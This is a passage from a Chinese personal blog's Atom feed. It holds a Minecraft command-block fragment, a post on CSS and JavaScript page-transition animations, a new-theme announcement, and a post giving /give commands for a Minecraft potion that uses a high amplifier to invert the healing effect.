[{\"text\":\"在线时间:\",\"color\":\"green\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"score\":{\"objective\":\"timed\",\"name\":\"@p\"},\"color\":\"gray\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"text\":\"天\",\"color\":\"gold\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"score\":{\"objective\":\"timeh\",\"name\":\"@p\"},\"color\":\"gray\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"text\":\"小时\",\"color\":\"gold\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"score\":{\"objective\":\"timem\",\"name\":\"@p\"},\"color\":\"gray\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"text\":\"分\",\"color\":\"gold\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"score\":{\"objective\":\"times\",\"name\":\"@p\"},\"color\":\"gray\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false},{\"text\":\"秒\",\"color\":\"gold\",\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false}]"},{id:command_block_minecart,Command:"setblock ~ ~1 ~ command_block{auto:1b,Command:\"fill ~ ~ ~ ~ ~-2 ~ air\"} replace"},{id:command_block_minecart,Command:"kill @e[type=command_block_minecart,distance=..1]"}]}]} ]]></content>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[CSS+JS实现页面切换过渡]]></title>
        <id>/articles/20210705/</id>
        <link href="https://ravelloh.top/articles/20210705/"/>
        <updated>2021-07-05T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 注: 此文章中涉及的部分博客功能已在RThemeV3中作出调整，可能已无参考价值 前言 因为自己最近在忙这个博客的建设，所以自己就想给这个blog做一个切换页面时的过渡。可在网上却都没什么符合这blog主题的，于是自己动手丰衣足食，自己就做了现在的这种效果。 效果 效果如此blog中的切换效果，即： 进入新页面时，除顶栏及底栏外的其余文字部分从屏幕左侧飞入， 离开此页面时，除顶栏及底栏外的其余文字部分从屏幕左侧飞出。 实现方式 考虑到需要有对进入\离开页面的检测，这里需要用到JavaScript。对样式的调整，我选择了使用CSS动画。 这样还有个优点：因为需要让动画结束后元素停留在结束位置，所以先使用动画，将元素从left:-xxxpx移动到left:0px即可。 而对于离开页面，则需要使用window.onbeforeunload参数检测是否离开页面，然后触发动画。 触发动画的方式，这里采用的是通过JS改变HTML内容的属性id，配合CSS选择器实现。 值得注意的是，因为网络原因可能会导致一个页面的加载时间变长，这时若离开页面的动画播放完毕则会重新回到原位置。 要解决这个问题，最好的办法是在css动画属性中加入"animation-fill-mode: forwards;",让动画结束时元素停在结束位置 代码 - - - CSS： Javascript: HTML 文字版 CSS： .text { position: relative; animation-name: startloading; animation-duration: 1s; } @keyframes startloading { 0% { left: -2000px } 100% { left: 0px; } } .text#active { position: relative; animation-name: endloading; animation-duration: 1s; color: #111111; animation-fill-mode: forwards; } @keyframes endloading { 0% { left: 0px } 100% { left: -2000px; } } JS： window.onbeforeunload = function (e) { document.getElementById("text").id = "active"; } HTML： <div class="text title" id="text"> 文字内容 </div> ]]></content>
        <category/>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[新主题上线]]></title>
        <id>/articles/20210701/</id>
        <link href="https://ravelloh.top/articles/20210701/"/>
        <updated>2021-07-01T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 最近做好了这个新主题并应用到博客， 因为之前的那个主题是基于Hexo的，自己现在也不太想用，干脆自己做了个 这个主题虽说比较简陋，但毕竟是自己做出来的，各方面都很了解，比之前那个四零八乱的好多了。 这个主题连同blog放在github了>>Github ]]></content>
        <category/>
        <category/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Minecraft反转药水效果]]></title>
        <id>/articles/20200816/</id>
        <link href="https://ravelloh.top/articles/20200816/"/>
        <updated>2020-08-16T00:00:00.000Z</updated>
        <content type="html"><![CDATA[ 原理 由于一些神奇的BUG特性，高等级效果将会使原效果被反转，而这就使得了一些原版不存在的操作变成了可能。例如，创造模式的玩家不免疫增益效果，只免疫负面效果，而这就使得了如果可以给予创造玩家一种增益效果但实际是负面效果，也是能对创造模式玩家造成伤害的。 除此以外，对跳跃提升药水运用相同的原理也有奇效:玩家将会无法跳跃 效果 另外，这个药水所带来的伤害也高的离谱： 也是因为未知原因，死亡后不掉落掉落物*开启死亡掉落的情况下 命令 /* 1.13+ */ /give @p minecraft:splash_potion{CustomPotionEffects:[{Id:6b,Duration:12000,Amplifier:125b,Ambient:0b,ShowParticles:0b}]} 1 /* 1.11-1.12 */ /give @p minecraft:splash_potion 1 0 {CustomPotionEffects:[{Id:6b,Duration:12000,Amplifier:125b,Ambient:0b,ShowParticles:0b}]} ]]></content>
        <category/>
    </entry>
</feed>